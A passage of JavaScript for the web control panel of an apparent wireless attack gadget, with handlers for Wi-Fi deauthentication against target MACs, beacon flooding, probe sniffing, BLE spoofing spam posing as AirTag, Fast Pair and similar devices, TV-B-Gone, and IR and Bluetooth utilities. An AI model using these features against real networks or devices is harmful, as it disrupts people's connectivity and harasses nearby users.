function wifiForgetNet(){const r=document.getElementById('savedNetResult');if(!confirm('Forget saved network?'))return;r.textContent='Forgetting...';r.style.color='#aa0';fetch('/api/wifi/forget').then(r=>r.text()).then(t=>{r.textContent=t;r.style.color='var(--fg)';wifiCheckSaved();}).catch(()=>{r.textContent='ERR';r.style.color='var(--accent2)';});}

let currentModule='home';
function showModule(mod){document.querySelectorAll('.content').forEach(p=>p.classList.remove('active'));const t=document.getElementById('page-'+mod);if(t)t.classList.add('active');currentModule=mod;document.getElementById('backBtn').style.display=(mod==='home')?'none':'inline-block';const labels={home:'OS',wifi:'WIFI',bt:'BT',config:'CONFIG',power:'POWER',deauth:'DEAUTH',beacon:'BEACON',hop:'HOP',probe:'PROBE',blespam:'BLE SPAM',bleopts:'BLE OPTS',themes:'THEMES',irhub:'IR HUB',music:'MUSIC'};document.getElementById('modLabel').textContent=labels[mod]||'OS';if(mod==='wifi'){wifiLoadConfig();wifiCheckSaved();}if(mod==='bt'){btLoadName();btRefreshPaired();}if(mod==='probe')probeFetchResults();if(mod==='hop')hopStatusPoll();if(mod==='themes')renderThemes();if(mod==='irhub'){irHubStatusPoll();loadSignals();loadRemotes();}if(mod==='music'){renderMusicList();musicPollStatus();}}
function goHome(){showModule('home');}
function btLoadName(){fetch('/api/bt/name').then(r=>r.text()).then(t=>{document.getElementById('btNameInput').value=t;}).catch(()=>{});}
function btSaveName(){const n=document.getElementById('btNameInput').value.trim(),r=document.getElementById('btNameResult');if(!n){r.textContent='Name required.';return;}r.textContent='Saving...';r.style.color='#aa0';fetch('/api/bt/name?name='+encodeURIComponent(n)).then(r=>r.text()).then(t=>{r.textContent=t;r.style.color=t.indexOf('SAVED')>=0?'var(--fg)':'var(--accent2)';}).catch(()=>{r.textContent='ERR';r.style.color='var(--accent2)';});}
function btPairDevice(name,mac){const pr=document.getElementById('blePairResult');if(!confirm('Pair with "'+name+'"? ('+mac+')'))return;pr.textContent='Pairing...';pr.style.color='#aa0';fetch('/api/bt/pair?mac='+encodeURIComponent(mac)+'&name='+encodeURIComponent(name)).then(r=>r.text()).then(t=>{pr.textContent=t;pr.style.color=t.indexOf('PAIRED OK')>=0?'var(--fg)':'var(--accent2)';if(t.indexOf('PAIRED OK')>=0)btRefreshPaired();}).catch(()=>{pr.textContent='ERR';pr.style.color='var(--accent2)';});}
function btRefreshPaired(){const list=document.getElementById('btPairedList'),ur=document.getElementById('btUnpairResult');fetch('/api/bt/paired').then(r=>r.json()).then(devices=>{list.innerHTML='';if(!devices||!devices.length){list.innerHTML='<div style="color:var(--dim);text-align:center;padding:12px">No devices.</div>';return;}devices.forEach((dev,i)=>{const row=document.createElement('div');row.style.cssText='display:flex;justify-content:space-between;align-items:center;padding:3px 0;font-size:.7em;border-bottom:1px solid var(--border)';row.innerHTML='<span style="color:var(--fg);flex:1">'+dev.name+'</span><span style="color:var(--dim);white-space:nowrap;margin-left:4px;font-size:.8em">'+dev.mac+'</span>';const upBtn=document.createElement('button');upBtn.textContent='UNPAIR';upBtn.className='btn btn-red';upBtn.style.cssText='border:1px solid var(--accent2);background:var(--bg);color:var(--accent2);padding:2px 6px;font-family:inherit;font-size:.7em;cursor:pointer;margin-left:4px;white-space:nowrap';upBtn.onclick=function(){btUnpairDevice(i);};row.appendChild(upBtn);list.appendChild(row);});ur.textContent='';}).catch(()=>{list.innerHTML='<div style="color:var(--accent2);text-align:center;padding:6px">Error</div>';});}
function btUnpairDevice(index){const ur=document.getElementById('btUnpairResult');if(!confirm('Unpair device '+index+'?'))return;ur.textContent='Unpairing...';ur.style.color='#aa0';fetch('/api/bt/unpair?index='+index).then(r=>r.text()).then(t=>{ur.textContent=t;ur.style.color=t.indexOf('UNPAIRED OK')>=0?'var(--fg)':'var(--accent2)';if(t.indexOf('UNPAIRED OK')>=0)btRefreshPaired();}).catch(()=>{ur.textContent='ERR';ur.style.color='var(--accent2)';});}

let _u=0;
setInterval(()=>{_u++;const h=Math.floor(_u/3600),m=Math.floor((_u%3600)/60),s=_u%60,ts=String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');document.getElementById('fUptime').textContent='UPTIME: '+ts;if(document.getElementById('cfgUptime'))document.getElementById('cfgUptime').textContent=ts;},1000);
function checkConnection(){const el=document.getElementById('connStatus');if(!el)return;const c=new AbortController();const t=setTimeout(()=>c.abort(),3000);fetch('/api/wifi/status',{signal:c.signal}).then(r=>r.text()).then(()=>{el.textContent='CONNECTED';el.style.color='var(--fg)';el.style.borderColor='var(--fg)';clearTimeout(t);}).catch(()=>{el.textContent='DISCONNECTED';el.style.color='var(--accent2)';el.style.borderColor='var(--accent2)';});}
setInterval(checkConnection,5000);checkConnection();
function toggleStatsFloater(){const f=document.getElementById('statsFloater');f.style.display=(f.style.display==='none'||f.style.display==='')?'flex':'none';}
function closeStats(){document.getElementById('statsFloater').style.display='none';}
function toggleLogFloater(){const f=document.getElementById('logFloater');f.style.display=(f.style.display==='none'||f.style.display==='')?'flex':'none';}
function closeLog(){document.getElementById('logFloater').style.display='none';}
function clearLog(){document.getElementById('logBody').innerHTML='';fetch('/api/log/clear').catch(()=>{});}
var lastLogCount=0;
function fetchLogs(){const body=document.getElementById('logBody');if(!body)return;fetch('/api/log').then(r=>r.json()).then(lines=>{if(!lines||!lines.length){body.innerHTML='<div class="log-line" style="color:var(--dim)">No logs</div>';lastLogCount=0;return;}let html='';lines.forEach(line=>{let color='var(--dim)';if(line.indexOf('[ERR]')>=0||line.indexOf('FAILED')>=0||line.indexOf('OFF')>=0)color='var(--accent2)';else if(line.indexOf('[BT]')>=0)color='var(--fg)';else if(line.indexOf('[WiFi]')>=0||line.indexOf('[CFG]')>=0)color='var(--fg)';else if(line.indexOf('[HACK]')>=0)color='var(--accent3)';html+='<div class="log-line" style="color:'+color+'">'+line+'</div>';});body.innerHTML=html;body.scrollTop=body.scrollHeight;lastLogCount=lines.length;}).catch(()=>{});}
setInterval(fetchLogs,2000);setTimeout(fetchLogs,500);

let wifiScanning=false;
function wifiScanNetworks(){const btn=document.getElementById('wifiScanBtn'),list=document.getElementById('wifiNetList'),count=document.getElementById('wifiScanCount');if(wifiScanning)return;wifiScanning=true;btn.textContent='SCANNING...';btn.style.opacity='0.5';list.innerHTML='<div style="color:var(--dim);text-align:center;padding:6px">Scanning...</div>';count.textContent='';fetch('/api/wifi/scan').then(r=>r.json()).then(nets=>{list.innerHTML='';if(!nets||!nets.length){list.innerHTML='<div style="color:var(--dim);text-align:center;padding:12px">No networks.</div>';count.textContent='0';}else{nets.forEach(net=>{const row=document.createElement('div');row.className='stat-row net-click';const bars=net.rssi>-50?'////':net.rssi>-65?'///':net.rssi>-80?'//':'/';const col=net.rssi>-50?'var(--fg)':net.rssi>-65?'var(--fg)':net.rssi>-80?'#aa0':'var(--accent2)';row.innerHTML='<span style="color:var(--fg);flex:1">'+net.ssid+'</span><span style="color:'+col+';white-space:nowrap;margin-left:4px;font-size:.85em">'+bars+' '+net.rssi+'dBm <span style="color:var(--dim);font-size:.8em">CH'+net.channel+' '+net.enc+'</span></span>';row.onclick=function(){document.getElementById('staSsidInput').value=net.ssid;document.getElementById('staPassInput').focus();};list.appendChild(row);});count.textContent=nets.length+' network'+(nets.length===1?'':'s');}wifiScanning=false;btn.textContent='SCAN';btn.style.opacity='1';}).catch(()=>{list.innerHTML='<div style="color:var(--accent2);text-align:center;padding:6px">Error</div>';wifiScanning=false;btn.textContent='SCAN';btn.style.opacity='1';});}
function wifiConnectToNet(){const ssid=document.getElementById('staSsidInput').value.trim(),pass=document.getElementById('staPassInput').value.trim(),result=document.getElementById('wifiConnectResult');if(!ssid){result.textContent='SSID required.';return;}result.textContent='Connecting...';result.style.color='#aa0';fetch('/api/wifi/connect?ssid='+encodeURIComponent(ssid)+'&pass='+encodeURIComponent(pass)).then(r=>r.text()).then(t=>{result.textContent=t;result.style.color=t.indexOf('CONNECTED')>=0?'var(--fg)':'var(--accent2)';}).catch(()=>{result.textContent='ERR';result.style.color='var(--accent2)';});}
function wifiLoadConfig(){fetch('/api/wifi/current').then(r=>r.json()).then(d=>{document.getElementById('apSsidInput').value=d.ssid||'';document.getElementById('apPassInput').value=d.pass||'';if(document.getElementById('cfgApSsid'))document.getElementById('cfgApSsid').textContent=d.ssid||'--';}).catch(()=>{});}
function wifiRadioToggle(){const e=document.getElementById('wifiRadioToggle').checked;document.getElementById('wifiRadioStatus').textContent=e?'RESTARTING...':'SHUTTING DOWN...';fetch('/api/wifi/toggle?state='+(e?'on':'off')).then(r=>r.text()).then(t=>{document.getElementById('wifiRadioStatus').textContent='RADIO IS '+t;if(t==='OFF')alert('WiFi disabled. Connection drops.');});}
function wifiSaveConfig(){const s=document.getElementById('apSsidInput').value.trim(),p=document.getElementById('apPassInput').value.trim(),r=document.getElementById('wifiConfigResult');if(!s){r.textContent='SSID required.';return;}r.textContent='Saving...';r.style.color='#aa0';fetch('/api/wifi/config?ssid='+encodeURIComponent(s)+'&pass='+encodeURIComponent(p)).then(r=>r.text()).then(t=>{r.textContent=t;r.style.color='var(--fg)';}).catch(()=>{r.textContent='ERR';r.style.color='var(--accent2)';});}

function btRadioToggle(){const e=document.getElementById('btRadioToggle').checked;document.getElementById('btRadioStatus').textContent='...';document.getElementById('btRadioStatus').style.color='#555';fetch('/api/bt/toggle?state='+(e?'on':'off')).then(r=>r.text()).then(t=>{const o=t==='ON';document.getElementById('btRadioToggle').checked=o;document.getElementById('btRadioStatus').textContent=o?'ON':'OFF';document.getElementById('btRadioStatus').style.color=o?'var(--fg)':'var(--accent2)';}).catch(()=>{document.getElementById('btRadioToggle').checked=!e;document.getElementById('btRadioStatus').textContent='ERR';document.getElementById('btRadioStatus').style.color='var(--accent2)';});}
let bleScanActive=false;
function bleSniff(){const btn=document.getElementById('bleScanBtn'),list=document.getElementById('bleScanList'),count=document.getElementById('bleScanCount');if(bleScanActive){bleScanActive=false;btn.textContent='START SCAN';return;}bleScanActive=true;btn.textContent='STOP SCAN';list.innerHTML='<div style="color:var(--dim);text-align:center;padding:6px">Scanning...</div>';count.textContent='';fetch('/api/bt/scan').then(r=>r.json()).then(devices=>{list.innerHTML='';if(!devices||!devices.length){list.innerHTML='<div style="color:var(--dim);text-align:center;padding:12px">No devices.</div>';count.textContent='0';}else{devices.forEach(dev=>{const row=document.createElement('div');row.style.cssText='display:flex;justify-content:space-between;padding:3px 0;font-size:.7em;border-bottom:1px solid var(--border)';const bars=dev.rssi>-50?'////':dev.rssi>-65?'///':dev.rssi>-80?'//':'/';const col=dev.rssi>-50?'var(--fg)':dev.rssi>-65?'var(--fg)':dev.rssi>-80?'#aa0':'var(--accent2)';row.innerHTML='<span style="color:var(--fg);flex:1">'+(dev.name||'Unknown')+'</span><span style="color:'+col+';white-space:nowrap;margin-left:8px;font-size:.85em">'+bars+' '+dev.rssi+'dBm <span style="color:var(--dim);font-size:.8em">'+dev.mac+'</span></span>';row.style.cursor='pointer';row.onclick=function(n,m){return function(){btPairDevice(n,m);};}(dev.name||'Unknown',dev.mac);list.appendChild(row);});count.textContent=devices.length+' device'+(devices.length===1?'':'s');}bleScanActive=false;btn.textContent='START SCAN';}).catch(()=>{list.innerHTML='<div style="color:var(--accent2);text-align:center;padding:6px">Error</div>';bleScanActive=false;btn.textContent='START SCAN';});}

let deauthActive=false;
function deauthToggle(){const btn=document.getElementById('deauthStartBtn'),status=document.getElementById('deauthStatus'),result=document.getElementById('deauthResult');if(deauthActive){fetch('/api/deauth/stop').then(r=>r.text()).then(t=>{deauthActive=false;btn.textContent='START DEAUTH';btn.style.borderColor='var(--accent2)';btn.style.color='var(--accent2)';status.textContent='OFF';status.className='status-tag off';result.textContent=t;result.style.color='var(--dim)';}).catch(()=>{});return;}
const target=document.getElementById('deauthTargetMac').value.trim();const ap=document.getElementById('deauthApMac').value.trim();const ch=document.getElementById('deauthChannel').value;const rate=document.getElementById('deauthRate').value;const reason=document.getElementById('deauthReason').value;const allch=document.getElementById('deauthAllCh').checked;
if(!target||!ap){result.textContent='Target & AP MAC required.';result.style.color='var(--accent2)';return;}
btn.textContent='STARTING...';btn.style.opacity='0.5';fetch('/api/deauth/start?target='+encodeURIComponent(target)+'&ap='+encodeURIComponent(ap)+'&ch='+ch+'&rate='+rate+'&reason='+reason+'&allch='+(allch?'1':'0')).then(r=>r.text()).then(t=>{deauthActive=true;btn.textContent='STOP DEAUTH';btn.style.borderColor='var(--fg)';btn.style.color='var(--fg)';btn.style.opacity='1';status.textContent='ACTIVE';status.className='status-tag active';result.textContent=t;result.style.color='var(--accent3)';}).catch(()=>{btn.textContent='ERR';btn.style.opacity='1';});}

let beaconActive=false;
function beaconToggle(){const btn=document.getElementById('beaconStartBtn'),status=document.getElementById('beaconStatus'),result=document.getElementById('beaconResult');if(beaconActive){fetch('/api/beacon/stop').then(r=>r.text()).then(t=>{beaconActive=false;btn.textContent='START BEACON FLOOD';btn.style.borderColor='var(--accent2)';btn.style.color='var(--accent2)';status.textContent='OFF';status.className='status-tag off';result.textContent=t;result.style.color='var(--dim)';}).catch(()=>{});return;}
const prefix=document.getElementById('beaconPrefix').value.trim();const count=document.getElementById('beaconCount').value;const ch=document.getElementById('beaconChannel').value;const enc=document.getElementById('beaconEnc').value;const rnd=document.getElementById('beaconRandomSsids').checked;
if(!prefix&&!rnd){result.textContent='Prefix required (or use random).';result.style.color='var(--accent2)';return;}
btn.textContent='STARTING...';btn.style.opacity='0.5';fetch('/api/beacon/start?prefix='+encodeURIComponent(prefix)+'&count='+count+'&ch='+ch+'&enc='+enc+'&random='+(rnd?'1':'0')).then(r=>r.text()).then(t=>{beaconActive=true;btn.textContent='STOP BEACON FLOOD';btn.style.borderColor='var(--fg)';btn.style.color='var(--fg)';btn.style.opacity='1';status.textContent='ACTIVE';status.className='status-tag active';result.textContent=t;result.style.color='var(--accent3)';}).catch(()=>{btn.textContent='ERR';btn.style.opacity='1';});}

let hopActive=false;
function hopToggle(){const btn=document.getElementById('hopStartBtn'),status=document.getElementById('hopStatus'),result=document.getElementById('hopResult');if(hopActive){fetch('/api/hop/stop').then(r=>r.text()).then(t=>{hopActive=false;btn.textContent='START HOPPING';btn.style.borderColor='var(--accent3)';btn.style.color='var(--accent3)';status.textContent='OFF';status.className='status-tag off';result.textContent=t;result.style.color='var(--dim)';}).catch(()=>{});return;}
btn.textContent='STARTING...';btn.style.opacity='0.5';fetch('/api/hop/start').then(r=>r.text()).then(t=>{hopActive=true;btn.textContent='STOP HOPPING';btn.style.borderColor='var(--fg)';btn.style.color='var(--fg)';btn.style.opacity='1';status.textContent='ACTIVE';status.className='status-tag active';result.textContent=t;result.style.color='var(--accent3)';}).catch(()=>{btn.textContent='ERR';btn.style.opacity='1';});}
function hopStatusPoll(){if(!hopActive)return;fetch('/api/hop/status').then(r=>r.text()).then(t=>{document.getElementById('hopChannel').textContent=t;if(hopActive)setTimeout(hopStatusPoll,1000);}).catch(()=>{});}

let probeActive=false;
function probeToggle(){const btn=document.getElementById('probeStartBtn'),status=document.getElementById('probeStatus'),result=document.getElementById('probeResult');if(probeActive){fetch('/api/probe/stop').then(r=>r.text()).then(t=>{probeActive=false;btn.textContent='START SNIFFER';btn.style.borderColor='var(--accent2)';btn.style.color='var(--accent2)';status.textContent='OFF';status.className='status-tag off';result.textContent=t;result.style.color='var(--dim)';}).catch(()=>{});return;}
btn.textContent='STARTING...';btn.style.opacity='0.5';fetch('/api/probe/start').then(r=>r.text()).then(t=>{probeActive=true;btn.textContent='STOP SNIFFER';btn.style.borderColor='var(--fg)';btn.style.color='var(--fg)';btn.style.opacity='1';status.textContent='ACTIVE';status.className='status-tag active';result.textContent=t;result.style.color='var(--accent3)';probeFetchResults();}).catch(()=>{btn.textContent='ERR';btn.style.opacity='1';});}
function probeFetchResults(){const list=document.getElementById('probeList'),cnt=document.getElementById('probeCount');if(!list)return;fetch('/api/probe/results').then(r=>r.json()).then(data=>{list.innerHTML='';if(!data||!data.length){list.innerHTML='<div style="color:var(--dim);text-align:center;padding:12px">No probes.</div>';cnt.textContent='0';return;}cnt.textContent=data.length;data.forEach(p=>{const row=document.createElement('div');row.style.cssText='display:flex;justify-content:space-between;padding:2px 0;font-size:.65em;border-bottom:1px solid var(--border)';const col=p.rssi>-60?'var(--fg)':p.rssi>-75?'#aa0':'var(--accent2)';row.innerHTML='<span style="color:var(--fg);flex:1">'+(p.ssid||'(Broadcast)')+'</span><span style="color:var(--dim);white-space:nowrap;margin-left:4px">'+p.mac+'</span><span style="color:'+col+';white-space:nowrap;margin-left:4px">'+p.rssi+'dBm CH'+p.ch+'</span>';list.appendChild(row);});if(probeActive)setTimeout(probeFetchResults,2000);}).catch(()=>{});}

let airtagActive=false;function airtagToggle(){const s=document.getElementById('airtagStatus'),b=document.getElementById('airtagStartBtn');if(airtagActive){fetch('/api/airtag/stop').then(r=>r.text()).then(t=>{airtagActive=false;b.textContent='START';b.style.borderColor='var(--accent4)';b.style.color='var(--accent4)';s.textContent='OFF';s.className='status-tag off';}).catch(()=>{});return;}fetch('/api/airtag/start').then(r=>r.text()).then(t=>{airtagActive=true;b.textContent='STOP';b.style.borderColor='var(--fg)';b.style.color='var(--fg)';s.textContent='ACTIVE';s.className='status-tag active';}).catch(()=>{});}
let smarttagActive=false;function smarttagToggle(){const s=document.getElementById('smarttagStatus'),b=document.getElementById('smarttagStartBtn');if(smarttagActive){fetch('/api/smarttag/stop').then(r=>r.text()).then(t=>{smarttagActive=false;b.textContent='START';b.style.borderColor='var(--accent4)';b.style.color='var(--accent4)';s.textContent='OFF';s.className='status-tag off';}).catch(()=>{});return;}fetch('/api/smarttag/start').then(r=>r.text()).then(t=>{smarttagActive=true;b.textContent='STOP';b.style.borderColor='var(--fg)';b.style.color='var(--fg)';s.textContent='ACTIVE';s.className='status-tag active';}).catch(()=>{});}
let swiftpairActive=false;function swiftpairToggle(){const s=document.getElementById('swiftpairStatus'),b=document.getElementById('swiftpairStartBtn');if(swiftpairActive){fetch('/api/swiftpair/stop').then(r=>r.text()).then(t=>{swiftpairActive=false;b.textContent='START';b.style.borderColor='var(--accent4)';b.style.color='var(--accent4)';s.textContent='OFF';s.className='status-tag off';}).catch(()=>{});return;}fetch('/api/swiftpair/start').then(r=>r.text()).then(t=>{swiftpairActive=true;b.textContent='STOP';b.style.borderColor='var(--fg)';b.style.color='var(--fg)';s.textContent='ACTIVE';s.className='status-tag active';}).catch(()=>{});}
let gfpActive=false;function gfpToggle(){const s=document.getElementById('gfpStatus'),b=document.getElementById('gfpStartBtn');if(gfpActive){fetch('/api/gfp/stop').then(r=>r.text()).then(t=>{gfpActive=false;b.textContent='START';b.style.borderColor='var(--accent4)';b.style.color='var(--accent4)';s.textContent='OFF';s.className='status-tag off';}).catch(()=>{});return;}fetch('/api/gfp/start').then(r=>r.text()).then(t=>{gfpActive=true;b.textContent='STOP';b.style.borderColor='var(--fg)';b.style.color='var(--fg)';s.textContent='ACTIVE';s.className='status-tag active';}).catch(()=>{});}
let ibeaconActive=false;function ibeaconToggle(){const s=document.getElementById('ibeaconStatus'),b=document.getElementById('ibeaconStartBtn');if(ibeaconActive){fetch('/api/ibeacon/stop').then(r=>r.text()).then(t=>{ibeaconActive=false;b.textContent='START';b.style.borderColor='var(--accent4)';b.style.color='var(--accent4)';s.textContent='OFF';s.className='status-tag off';}).catch(()=>{});return;}fetch('/api/ibeacon/start').then(r=>r.text()).then(t=>{ibeaconActive=true;b.textContent='STOP';b.style.borderColor='var(--fg)';b.style.color='var(--fg)';s.textContent='ACTIVE';s.className='status-tag active';}).catch(()=>{});}
let eddystoneActive=false;function eddystoneToggle(){const s=document.getElementById('eddystoneStatus'),b=document.getElementById('eddystoneStartBtn');if(eddystoneActive){fetch('/api/eddystone/stop').then(r=>r.text()).then(t=>{eddystoneActive=false;b.textContent='START';b.style.borderColor='var(--accent4)';b.style.color='var(--accent4)';s.textContent='OFF';s.className='status-tag off';}).catch(()=>{});return;}fetch('/api/eddystone/start').then(r=>r.text()).then(t=>{eddystoneActive=true;b.textContent='STOP';b.style.borderColor='var(--fg)';b.style.color='var(--fg)';s.textContent='ACTIVE';s.className='status-tag active';}).catch(()=>{});}
let bleSpamActive=false;function bleSpamToggle(){const s=document.getElementById('bleSpamStatus'),b=document.getElementById('bleSpamStartBtn');if(bleSpamActive){fetch('/api/blespam/stop').then(r=>r.text()).then(t=>{bleSpamActive=false;b.textContent='START';b.style.borderColor='var(--accent4)';b.style.color='var(--accent4)';s.textContent='OFF';s.className='status-tag off';}).catch(()=>{});return;}fetch('/api/blespam/start').then(r=>r.text()).then(t=>{bleSpamActive=true;b.textContent='STOP';b.style.borderColor='var(--fg)';b.style.color='var(--fg)';s.textContent='ACTIVE';s.className='status-tag active';}).catch(()=>{});}
let nameRandActive=false;function nameRandToggle(){const s=document.getElementById('nameRandStatus'),b=document.getElementById('nameRandStartBtn');if(nameRandActive){fetch('/api/namerand/off').then(r=>r.text()).then(t=>{nameRandActive=false;b.textContent='TOGGLE';b.style.borderColor='var(--accent4)';b.style.color='var(--accent4)';s.textContent='OFF';s.className='status-tag off';}).catch(()=>{});return;}fetch('/api/namerand/on').then(r=>r.text()).then(t=>{nameRandActive=true;b.textContent='TOGGLE';b.style.borderColor='var(--fg)';b.style.color='var(--fg)';s.textContent='ON';s.className='status-tag on';}).catch(()=>{});}
function stopAllBleSpam(){const r=document.getElementById('stopAllResult');r.textContent='Stopping all...';r.style.color='#aa0';fetch('/api/blespam/stopall').then(res=>res.text()).then(t=>{r.textContent=t;r.style.color='var(--fg)';if(airtagActive)airtagToggle();if(smarttagActive)smarttagToggle();if(swiftpairActive)swiftpairToggle();if(gfpActive)gfpToggle();if(ibeaconActive)ibeaconToggle();if(eddystoneActive)eddystoneToggle();if(bleSpamActive)bleSpamToggle();}).catch(()=>{r.textContent='ERR';r.style.color='var(--accent2)';});}

function systemReboot(){const r=document.getElementById('powerResult');if(!confirm('Reboot?'))return;r.textContent='Rebooting...';r.style.color='#aa0';fetch('/api/system/reboot').then(r=>r.text()).then(t=>{r.textContent=t;}).catch(()=>{r.textContent='Rebooting...';});}
function systemReset(){const r=document.getElementById('powerResult');if(!confirm('Factory reset? Everything will be erased.'))return;r.textContent='Resetting...';r.style.color='#aa0';fetch('/api/system/reset').then(r=>r.text()).then(t=>{r.textContent=t;}).catch(()=>{r.textContent='Resetting...';});}

let irScanning=false;
function irToggleScan(){const e=document.getElementById('irScanToggle').checked;fetch('/api/ir/scan?state='+(e?'on':'off')).then(r=>r.text()).then(t=>{irScanning=(t==='ON');document.getElementById('irScanToggle').checked=irScanning;if(irScanning)irStatusPoll();});}
function irStatusPoll(){if(currentModule!=='irhub')return;fetch('/api/ir/last').then(r=>r.json()).then(d=>{document.getElementById('irProto').textContent=d.protocol;document.getElementById('irValue').textContent=d.value;document.getElementById('irBits').textContent=d.bits;if(irScanning||currentModule==='irhub')setTimeout(irStatusPoll,1000);});}
function irSend(){const p=document.getElementById('irSendProto').value,v=document.getElementById('irSendValue').value,b=document.getElementById('irSendBits').value;fetch('/api/ir/send?proto='+p+'&value='+encodeURIComponent(v)+'&bits='+b).then(r=>r.text()).then(t=>addLog('[IR] '+t));}
let tvbgoneActive=false;function tvbgoneToggle(){const b=document.getElementById('tvbgoneBtn'),s=document.getElementById('tvbgoneStatus');if(tvbgoneActive){fetch('/api/ir/tvbgone/stop').then(r=>r.text()).then(t=>{tvbgoneActive=false;b.textContent='START TV-B-GONE';b.className='btn btn-red btn-full mt-6';s.textContent='OFF';s.className='status-tag off';});}else{fetch('/api/ir/tvbgone/start').then(r=>r.text()).then(t=>{tvbgoneActive=true;b.textContent='STOP TV-B-GONE';b.className='btn btn-orange btn-full mt-6';s.textContent='ACTIVE';s.className='status-tag active';});}}

let greeTempVal = 24;
function greeTempAdjust(delta){greeTempVal = Math.max(16, Math.min(30, greeTempVal + delta));document.getElementById('greeTemp').textContent = greeTempVal;}
function greeSend(){const p=document.getElementById('greePower').checked?'1':'0';const m=document.getElementById('greeMode').value;const f=document.getElementById('greeFan').value;const r=document.getElementById('greeResult');r.textContent='Sending...';r.style.color='#aa0';fetch('/api/ir/gree?power='+p+'&temp='+greeTempVal+'&mode='+m+'&fan='+f).then(r=>r.text()).then(t=>{r.textContent=t;r.style.color='var(--fg)';}).catch(()=>{r.textContent='ERR';r.style.color='var(--accent2)';});}

let irCaptureActive = false;let irCaptureTimer = null;
function irCaptureSignal(){if(irCaptureActive) return;const btn=document.getElementById('irCaptureBtn');const cd=document.getElementById('irCaptureCountdown');const res=document.getElementById('irCaptureResult');irCaptureActive=true;btn.textContent='LISTENING...';btn.style.opacity='0.5';cd.style.display='block';cd.textContent='10';res.style.display='none';fetch('/api/ir/record',{method:'POST'}).then(r=>r.text()).then(t=>{let sec=10;irCaptureTimer=setInterval(()=>{sec--;cd.textContent=sec;if(sec<=0){clearInterval(irCaptureTimer);irCaptureActive=false;btn.textContent='CAPTURE SIGNAL';btn.style.opacity='1';cd.style.display='none';cd.textContent='10';}},1000);}).catch(()=>{irCaptureActive=false;btn.textContent='CAPTURE SIGNAL';btn.style.opacity='1';cd.style.display='none';});}
function irHubStatusPoll(){if(currentModule!=='irhub')return;fetch('/api/ir/state').then(r=>r.json()).then(d=>{const res=document.getElementById('irCaptureResult');if(d.protocol&&d.protocol!=='Unknown'&&d.protocol!==''){res.style.display='block';res.innerHTML='<strong>Last:</strong> '+d.protocol+' <strong>0x</strong>'+d.value+' ('+d.bits+' bits)';if(irCaptureActive&&irCaptureTimer){clearInterval(irCaptureTimer);irCaptureTimer=null;irCaptureActive=false;document.getElementById('irCaptureBtn').textContent='CAPTURE SIGNAL';document.getElementById('irCaptureBtn').style.opacity='1';document.getElementById('irCaptureCountdown').style.display='none';document.getElementById('irCaptureCountdown').textContent='10';}}setTimeout(irHubStatusPoll,2000);}).catch(()=>{setTimeout(irHubStatusPoll,3000);});}
function togglePass(i,b){const inp=document.getElementById(i),btn=document.getElementById(b);if(inp.type==='password'){inp.type='text';btn.textContent='HIDE';}else{inp.type='password';btn.textContent='SHOW';}}
function toggleSection(sectionId){const section=document.getElementById(sectionId);if(section.style.display==='none'||section.style.display===''){section.style.display='block';}else{section.style.display='none';}}

// ===================== MUSIC PLAYER =====================
let musicSelectedSong = 0;
const MUSIC_SONGS = ["Super Mario","Harry Potter","Imperial March","Tetris","Nokia Ringtone","Fur Elise"];

function renderMusicList() {
  const list = document.getElementById('musicList');
  if (!list) return;
  list.innerHTML = '';
  MUSIC_SONGS.forEach((name, i) => {
    const row = document.createElement('div');
    row.style.cssText = 'display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid var(--border);font-size:.75em;cursor:pointer';
    row.innerHTML = '<span style="color:var(--fg)">' + name + '</span>';
    if (i === musicSelectedSong) {
      row.style.borderColor = 'var(--accent3)';
      row.style.background = 'var(--card-bg)';
      row.innerHTML += '<span style="color:var(--accent3);font-size:.7em">▶ SELECTED</span>';
    }
    row.onclick = function() { musicSelectSong(i); };
    list.appendChild(row);
  });
}

function musicSelectSong(idx) {
  musicSelectedSong = idx;
  document.getElementById('musicNow').textContent = MUSIC_SONGS[idx];
  fetch('/api/music/select?idx=' + idx).catch(()=>{});
  renderMusicList();
  addLog('[MUSIC] Selected: ' + MUSIC_SONGS[idx]);
}

function musicTogglePlay() {
  const btn = document.getElementById('musicPlayBtn');
  const status = document.getElementById('musicStatus');
  if (btn.textContent === 'PLAY') {
    fetch('/api/music/play').then(r=>r.text()).then(t=>{
      btn.textContent = 'STOP';
      btn.style.borderColor = 'var(--accent2)';
      btn.style.color = 'var(--accent2)';
      status.textContent = 'PLAYING';
      status.className = 'status-tag active';
      document.getElementById('musicNow').textContent = MUSIC_SONGS[musicSelectedSong];
      addLog('[MUSIC] Playing');
    }).catch(()=>{});
  } else {
    fetch('/api/music/stop').then(r=>r.text()).then(t=>{
      btn.textContent = 'PLAY';
      btn.style.borderColor = 'var(--accent3)';
      btn.style.color = 'var(--accent3)';
      status.textContent = 'STOPPED';
      status.className = 'status-tag off';
      addLog('[MUSIC] Stopped');
    }).catch(()=>{});
  }
}

function musicPollStatus() {
  if (document.getElementById('page-music') && !document.getElementById('page-music').classList.contains('active')) return;
  fetch('/api/music/status').then(r=>r.json()).then(d=>{
    const btn = document.getElementById('musicPlayBtn');
    const status = document.getElementById('musicStatus');
    if (d.playing) {
      btn.textContent = 'STOP';
      btn.style.borderColor = 'var(--accent2)';
      btn.style.color = 'var(--accent2)';
      status.textContent = 'PLAYING';
      status.className = 'status-tag active';
      if (d.songName) document.getElementById('musicNow').textContent = d.songName;
    } else {
      btn.textContent = 'PLAY';
      btn.style.borderColor = 'var(--accent3)';
      btn.style.color = 'var(--accent3)';
      status.textContent = 'STOPPED';
      status.className = 'status-tag off';
    }
  }).catch(()=>{});
  setTimeout(musicPollStatus, 2000);
}
// ===================== SIGNALS LIBRARY =====================
let signalsData = [];
function loadSignals() {
  fetch('/api/signals/load').then(r=>r.json()).then(data=>{signalsData=data;renderSignals();}).catch(()=>{signalsData=[];renderSignals();});
}
function saveSignals() {
  fetch('/api/signals/save',{method:'POST',body:JSON.stringify(signalsData)}).catch(()=>{});
}
function renderSignals() {
  const list=document.getElementById('signalsList');if(!list)return;
  const search=document.getElementById('sigSearchInput').value.toLowerCase();
  list.innerHTML='';
  signalsData.forEach((s,i)=>{
    if(!s.name.toLowerCase().includes(search)&&!s.value.toLowerCase().includes(search))return;
    const row=document.createElement('div');
    row.style.cssText='display:flex;justify-content:space-between;align-items:center;padding:4px 0;border-bottom:1px solid var(--border);font-size:.7em';
